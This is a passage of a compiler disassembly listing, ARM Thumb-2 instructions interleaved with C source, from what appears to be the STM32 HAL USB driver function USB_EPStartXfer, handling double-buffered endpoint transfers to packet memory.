 8006ab8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006abc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006ac0:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006ac4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ac8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006acc:	681a      	ldr	r2, [r3, #0]
 8006ace:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ad2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ad6:	681b      	ldr	r3, [r3, #0]
 8006ad8:	781b      	ldrb	r3, [r3, #0]
 8006ada:	009b      	lsls	r3, r3, #2
 8006adc:	441a      	add	r2, r3
 8006ade:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006ae2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006ae6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006aea:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006aee:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006af2:	b29b      	uxth	r3, r3
 8006af4:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006af6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006afa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006afe:	681b      	ldr	r3, [r3, #0]
 8006b00:	6a1a      	ldr	r2, [r3, #32]
 8006b02:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b06:	1ad2      	subs	r2, r2, r3
 8006b08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b0c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b10:	681b      	ldr	r3, [r3, #0]
 8006b12:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006b14:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b18:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b1c:	681a      	ldr	r2, [r3, #0]
 8006b1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b26:	681b      	ldr	r3, [r3, #0]
 8006b28:	781b      	ldrb	r3, [r3, #0]
 8006b2a:	009b      	lsls	r3, r3, #2
 8006b2c:	4413      	add	r3, r2
 8006b2e:	881b      	ldrh	r3, [r3, #0]
 8006b30:	b29b      	uxth	r3, r3
 8006b32:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006b36:	2b00      	cmp	r3, #0
 8006b38:	f000 81c7 	beq.w	8006eca <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006b3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b40:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b44:	681b      	ldr	r3, [r3, #0]
 8006b46:	633b      	str	r3, [r7, #48]	; 0x30
 8006b48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b50:	681b      	ldr	r3, [r3, #0]
 8006b52:	785b      	ldrb	r3, [r3, #1]
 8006b54:	2b00      	cmp	r3, #0
 8006b56:	d177      	bne.n	8006c48 <USB_EPStartXfer+0x2ce>
 8006b58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b5c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b60:	681b      	ldr	r3, [r3, #0]
 8006b62:	62bb      	str	r3, [r7, #40]	; 0x28
 8006b64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b68:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b6c:	681b      	ldr	r3, [r3, #0]
 8006b6e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006b72:	b29b      	uxth	r3, r3
 8006b74:	461a      	mov	r2, r3
 8006b76:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006b78:	4413      	add	r3, r2
 8006b7a:	62bb      	str	r3, [r7, #40]	; 0x28
 8006b7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b80:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b84:	681b      	ldr	r3, [r3, #0]
 8006b86:	781b      	ldrb	r3, [r3, #0]
 8006b88:	00da      	lsls	r2, r3, #3
 8006b8a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006b8c:	4413      	add	r3, r2
 8006b8e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006b92:	627b      	str	r3, [r7, #36]	; 0x24
 8006b94:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006b96:	881b      	ldrh	r3, [r3, #0]
 8006b98:	b29b      	uxth	r3, r3
 8006b9a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006b9e:	b29a      	uxth	r2, r3
 8006ba0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ba2:	801a      	strh	r2, [r3, #0]
 8006ba4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ba8:	2b3e      	cmp	r3, #62	; 0x3e
 8006baa:	d921      	bls.n	8006bf0 <USB_EPStartXfer+0x276>
 8006bac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006bb0:	095b      	lsrs	r3, r3, #5
 8006bb2:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006bb6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006bba:	f003 031f 	and.w	r3, r3, #31
 8006bbe:	2b00      	cmp	r3, #0
 8006bc0:	d104      	bne.n	8006bcc <USB_EPStartXfer+0x252>
 8006bc2:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006bc6:	3b01      	subs	r3, #1
 8006bc8:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006bcc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006bce:	881b      	ldrh	r3, [r3, #0]
 8006bd0:	b29a      	uxth	r2, r3
 8006bd2:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006bd6:	b29b      	uxth	r3, r3
 8006bd8:	029b      	lsls	r3, r3, #10
 8006bda:	b29b      	uxth	r3, r3
 8006bdc:	4313      	orrs	r3, r2
 8006bde:	b29b      	uxth	r3, r3
 8006be0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006be4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006be8:	b29a      	uxth	r2, r3
 8006bea:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006bec:	801a      	strh	r2, [r3, #0]
 8006bee:	e050      	b.n	8006c92 <USB_EPStartXfer+0x318>
 8006bf0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006bf4:	2b00      	cmp	r3, #0
 8006bf6:	d10a      	bne.n	8006c0e <USB_EPStartXfer+0x294>
 8006bf8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006bfa:	881b      	ldrh	r3, [r3, #0]
 8006bfc:	b29b      	uxth	r3, r3
 8006bfe:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c02:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c06:	b29a      	uxth	r2, r3
 8006c08:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c0a:	801a      	strh	r2, [r3, #0]
 8006c0c:	e041      	b.n	8006c92 <USB_EPStartXfer+0x318>
 8006c0e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c12:	085b      	lsrs	r3, r3, #1
 8006c14:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c18:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c1c:	f003 0301 	and.w	r3, r3, #1
 8006c20:	2b00      	cmp	r3, #0
 8006c22:	d004      	beq.n	8006c2e <USB_EPStartXfer+0x2b4>
 8006c24:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c28:	3301      	adds	r3, #1
 8006c2a:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c2e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c30:	881b      	ldrh	r3, [r3, #0]
 8006c32:	b29a      	uxth	r2, r3
 8006c34:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c38:	b29b      	uxth	r3, r3
 8006c3a:	029b      	lsls	r3, r3, #10
 8006c3c:	b29b      	uxth	r3, r3
 8006c3e:	4313      	orrs	r3, r2
 8006c40:	b29a      	uxth	r2, r3
 8006c42:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c44:	801a      	strh	r2, [r3, #0]
 8006c46:	e024      	b.n	8006c92 <USB_EPStartXfer+0x318>
 8006c48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c50:	681b      	ldr	r3, [r3, #0]
 8006c52:	785b      	ldrb	r3, [r3, #1]
 8006c54:	2b01      	cmp	r3, #1
 8006c56:	d11c      	bne.n	8006c92 <USB_EPStartXfer+0x318>
 8006c58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c5c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c60:	681b      	ldr	r3, [r3, #0]
 8006c62:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006c66:	b29b      	uxth	r3, r3
 8006c68:	461a      	mov	r2, r3
 8006c6a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006c6c:	4413      	add	r3, r2
 8006c6e:	633b      	str	r3, [r7, #48]	; 0x30
 8006c70:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c74:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c78:	681b      	ldr	r3, [r3, #0]
 8006c7a:	781b      	ldrb	r3, [r3, #0]
 8006c7c:	00da      	lsls	r2, r3, #3
 8006c7e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006c80:	4413      	add	r3, r2
 8006c82:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006c86:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006c88:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c8c:	b29a      	uxth	r2, r3
 8006c8e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006c90:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006c92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c96:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c9a:	681b      	ldr	r3, [r3, #0]
 8006c9c:	895b      	ldrh	r3, [r3, #10]
 8006c9e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006ca2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ca6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006caa:	681b      	ldr	r3, [r3, #0]
 8006cac:	6959      	ldr	r1, [r3, #20]
 8006cae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cb2:	b29b      	uxth	r3, r3
 8006cb4:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006cb8:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006cbc:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006cc0:	6800      	ldr	r0, [r0, #0]
 8006cc2:	f001 fb66 	bl	8008392 <USB_WritePMA>
            ep->xfer_buff += len;
 8006cc6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cce:	681b      	ldr	r3, [r3, #0]
 8006cd0:	695a      	ldr	r2, [r3, #20]
 8006cd2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cd6:	441a      	add	r2, r3
 8006cd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cdc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ce0:	681b      	ldr	r3, [r3, #0]
 8006ce2:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006ce4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ce8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cec:	681b      	ldr	r3, [r3, #0]
 8006cee:	6a1a      	ldr	r2, [r3, #32]
 8006cf0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cf8:	681b      	ldr	r3, [r3, #0]
 8006cfa:	691b      	ldr	r3, [r3, #16]
 8006cfc:	429a      	cmp	r2, r3
 8006cfe:	d90f      	bls.n	8006d20 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006d00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d08:	681b      	ldr	r3, [r3, #0]
 8006d0a:	6a1a      	ldr	r2, [r3, #32]
 8006d0c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d10:	1ad2      	subs	r2, r2, r3
 8006d12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d1a:	681b      	ldr	r3, [r3, #0]
 8006d1c:	621a      	str	r2, [r3, #32]
 8006d1e:	e00e      	b.n	8006d3e <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006d20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d24:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d28:	681b      	ldr	r3, [r3, #0]
 8006d2a:	6a1b      	ldr	r3, [r3, #32]
 8006d2c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006d30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d34:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d38:	681b      	ldr	r3, [r3, #0]
 8006d3a:	2200      	movs	r2, #0
 8006d3c:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006d3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d42:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d46:	681b      	ldr	r3, [r3, #0]
 8006d48:	785b      	ldrb	r3, [r3, #1]
 8006d4a:	2b00      	cmp	r3, #0
 8006d4c:	d177      	bne.n	8006e3e <USB_EPStartXfer+0x4c4>
 8006d4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d52:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d56:	681b      	ldr	r3, [r3, #0]
 8006d58:	61bb      	str	r3, [r7, #24]
 8006d5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d5e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d62:	681b      	ldr	r3, [r3, #0]
 8006d64:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d68:	b29b      	uxth	r3, r3
 8006d6a:	461a      	mov	r2, r3
 8006d6c:	69bb      	ldr	r3, [r7, #24]
 8006d6e:	4413      	add	r3, r2
 8006d70:	61bb      	str	r3, [r7, #24]
 8006d72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d7a:	681b      	ldr	r3, [r3, #0]
 8006d7c:	781b      	ldrb	r3, [r3, #0]
 8006d7e:	00da      	lsls	r2, r3, #3
 8006d80:	69bb      	ldr	r3, [r7, #24]
 8006d82:	4413      	add	r3, r2
 8006d84:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006d88:	617b      	str	r3, [r7, #20]
 8006d8a:	697b      	ldr	r3, [r7, #20]
 8006d8c:	881b      	ldrh	r3, [r3, #0]
 8006d8e:	b29b      	uxth	r3, r3
 8006d90:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006d94:	b29a      	uxth	r2, r3
 8006d96:	697b      	ldr	r3, [r7, #20]
 8006d98:	801a      	strh	r2, [r3, #0]
 8006d9a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d9e:	2b3e      	cmp	r3, #62	; 0x3e
 8006da0:	d921      	bls.n	8006de6 <USB_EPStartXfer+0x46c>
 8006da2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006da6:	095b      	lsrs	r3, r3, #5
 8006da8:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006dac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006db0:	f003 031f 	and.w	r3, r3, #31
 8006db4:	2b00      	cmp	r3, #0
 8006db6:	d104      	bne.n	8006dc2 <USB_EPStartXfer+0x448>
 8006db8:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006dbc:	3b01      	subs	r3, #1
 8006dbe:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006dc2:	697b      	ldr	r3, [r7, #20]
 8006dc4:	881b      	ldrh	r3, [r3, #0]
 8006dc6:	b29a      	uxth	r2, r3
 8006dc8:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006dcc:	b29b      	uxth	r3, r3
 8006dce:	029b      	lsls	r3, r3, #10
 8006dd0:	b29b      	uxth	r3, r3
 8006dd2:	4313      	orrs	r3, r2
 8006dd4:	b29b      	uxth	r3, r3
 8006dd6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006dda:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006dde:	b29a      	uxth	r2, r3
 8006de0:	697b      	ldr	r3, [r7, #20]
 8006de2:	801a      	strh	r2, [r3, #0]
 8006de4:	e056      	b.n	8006e94 <USB_EPStartXfer+0x51a>
 8006de6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006dea:	2b00      	cmp	r3, #0
 8006dec:	d10a      	bne.n	8006e04 <USB_EPStartXfer+0x48a>
 8006dee:	697b      	ldr	r3, [r7, #20]
 8006df0:	881b      	ldrh	r3, [r3, #0]
 8006df2:	b29b      	uxth	r3, r3
 8006df4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006df8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006dfc:	b29a      	uxth	r2, r3
 8006dfe:	697b      	ldr	r3, [r7, #20]
 8006e00:	801a      	strh	r2, [r3, #0]
 8006e02:	e047      	b.n	8006e94 <USB_EPStartXfer+0x51a>
 8006e04:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e08:	085b      	lsrs	r3, r3, #1
 8006e0a:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e0e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e12:	f003 0301 	and.w	r3, r3, #1
 8006e16:	2b00      	cmp	r3, #0
 8006e18:	d004      	beq.n	8006e24 <USB_EPStartXfer+0x4aa>
 8006e1a:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e1e:	3301      	adds	r3, #1
 8006e20:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e24:	697b      	ldr	r3, [r7, #20]
 8006e26:	881b      	ldrh	r3, [r3, #0]
 8006e28:	b29a      	uxth	r2, r3
 8006e2a:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e2e:	b29b      	uxth	r3, r3
 8006e30:	029b      	lsls	r3, r3, #10
 8006e32:	b29b      	uxth	r3, r3
 8006e34:	4313      	orrs	r3, r2
 8006e36:	b29a      	uxth	r2, r3
 8006e38:	697b      	ldr	r3, [r7, #20]
 8006e3a:	801a      	strh	r2, [r3, #0]
 8006e3c:	e02a      	b.n	8006e94 <USB_EPStartXfer+0x51a>
 8006e3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e42:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e46:	681b      	ldr	r3, [r3, #0]
 8006e48:	785b      	ldrb	r3, [r3, #1]
 8006e4a:	2b01      	cmp	r3, #1
 8006e4c:	d122      	bne.n	8006e94 <USB_EPStartXfer+0x51a>
 8006e4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e52:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e56:	681b      	ldr	r3, [r3, #0]
 8006e58:	623b      	str	r3, [r7, #32]
 8006e5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e5e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e62:	681b      	ldr	r3, [r3, #0]
 8006e64:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006e68:	b29b      	uxth	r3, r3
 8006e6a:	461a      	mov	r2, r3
 8006e6c:	6a3b      	ldr	r3, [r7, #32]
 8006e6e:	4413      	add	r3, r2
 8006e70:	623b      	str	r3, [r7, #32]
 8006e72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e7a:	681b      	ldr	r3, [r3, #0]
 8006e7c:	781b      	ldrb	r3, [r3, #0]
 8006e7e:	00da      	lsls	r2, r3, #3
 8006e80:	6a3b      	ldr	r3, [r7, #32]
 8006e82:	4413      	add	r3, r2
 8006e84:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e88:	61fb      	str	r3, [r7, #28]
 8006e8a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e8e:	b29a      	uxth	r2, r3
 8006e90:	69fb      	ldr	r3, [r7, #28]
 8006e92:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006e94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e9c:	681b      	ldr	r3, [r3, #0]
 8006e9e:	891b      	ldrh	r3, [r3, #8]
 8006ea0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006ea4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ea8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006eac:	681b      	ldr	r3, [r3, #0]
 8006eae:	6959      	ldr	r1, [r3, #20]
 8006eb0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eb4:	b29b      	uxth	r3, r3
 8006eb6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006eba:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006ebe:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006ec2:	6800      	ldr	r0, [r0, #0]
 8006ec4:	f001 fa65 	bl	8008392 <USB_WritePMA>
 8006ec8:	e3ee      	b.n	80076a8 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006eca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ece:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ed2:	681b      	ldr	r3, [r3, #0]
 8006ed4:	785b      	ldrb	r3, [r3, #1]
 8006ed6:	2b00      	cmp	r3, #0
 8006ed8:	d177      	bne.n	8006fca <USB_EPStartXfer+0x650>
 8006eda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ede:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ee2:	681b      	ldr	r3, [r3, #0]
 8006ee4:	64bb      	str	r3, [r7, #72]	; 0x48
 8006ee6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006eea:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006eee:	681b      	ldr	r3, [r3, #0]
 8006ef0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006ef4:	b29b      	uxth	r3, r3
 8006ef6:	461a      	mov	r2, r3
 8006ef8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006efa:	4413      	add	r3, r2
 8006efc:	64bb      	str	r3, [r7, #72]	; 0x48
 8006efe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f06:	681b      	ldr	r3, [r3, #0]
 8006f08:	781b      	ldrb	r3, [r3, #0]
 8006f0a:	00da      	lsls	r2, r3, #3
 8006f0c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006f0e:	4413      	add	r3, r2
 8006f10:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f14:	647b      	str	r3, [r7, #68]	; 0x44
 8006f16:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f18:	881b      	ldrh	r3, [r3, #0]
 8006f1a:	b29b      	uxth	r3, r3
 8006f1c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006f20:	b29a      	uxth	r2, r3
 8006f22:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f24:	801a      	strh	r2, [r3, #0]
 8006f26:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f2a:	2b3e      	cmp	r3, #62	; 0x3e
 8006f2c:	d921      	bls.n	8006f72 <USB_EPStartXfer+0x5f8>
 8006f2e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f32:	095b      	lsrs	r3, r3, #5
 8006f34:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006f38:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f3c:	f003 031f 	and.w	r3, r3, #31
 8006f40:	2b00      	cmp	r3, #0
 8006f42:	d104      	bne.n	8006f4e <USB_EPStartXfer+0x5d4>
 8006f44:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006f48:	3b01      	subs	r3, #1
 8006f4a:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006f4e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f50:	881b      	ldrh	r3, [r3, #0]
 8006f52:	b29a      	uxth	r2, r3
 8006f54:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006f58:	b29b      	uxth	r3, r3
 8006f5a:	029b      	lsls	r3, r3, #10
 8006f5c:	b29b      	uxth	r3, r3
 8006f5e:	4313      	orrs	r3, r2
 8006f60:	b29b      	uxth	r3, r3
 8006f62:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006f66:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006f6a:	b29a      	uxth	r2, r3
 8006f6c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f6e:	801a      	strh	r2, [r3, #0]
 8006f70:	e056      	b.n	8007020 <USB_EPStartXfer+0x6a6>
 8006f72:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f76:	2b00      	cmp	r3, #0
 8006f78:	d10a      	bne.n	8006f90 <USB_EPStartXfer+0x616>
 8006f7a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f7c:	881b      	ldrh	r3, [r3, #0]
 8006f7e:	b29b      	uxth	r3, r3
 8006f80:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006f84:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006f88:	b29a      	uxth	r2, r3
 8006f8a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006f8c:	801a      	strh	r2, [r3, #0]
 8006f8e:	e047      	b.n	8007020 <USB_EPStartXfer+0x6a6>
 8006f90:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f94:	085b      	lsrs	r3, r3, #1
 8006f96:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006f9a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f9e:	f003 0301 	and.w	r3, r3, #1
 8006fa2:	2b00      	cmp	r3, #0
 8006fa4:	d004      	beq.n	8006fb0 <USB_EPStartXfer+0x636>
 8006fa6:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006faa:	3301      	adds	r3, #1
 8006fac:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006fb0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fb2:	881b      	ldrh	r3, [r3, #0]
 8006fb4:	b29a      	uxth	r2, r3
 8006fb6:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006fba:	b29b      	uxth	r3, r3
 8006fbc:	029b      	lsls	r3, r3, #10
 8006fbe:	b29b      	uxth	r3, r3
 8006fc0:	4313      	orrs	r3, r2
 8006fc2:	b29a      	uxth	r2, r3
 8006fc4:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fc6:	801a      	strh	r2, [r3, #0]
 8006fc8:	e02a      	b.n	8007020 <USB_EPStartXfer+0x6a6>
 8006fca:	f507 7384 	add.w	r3, r7, #264	; 0x108
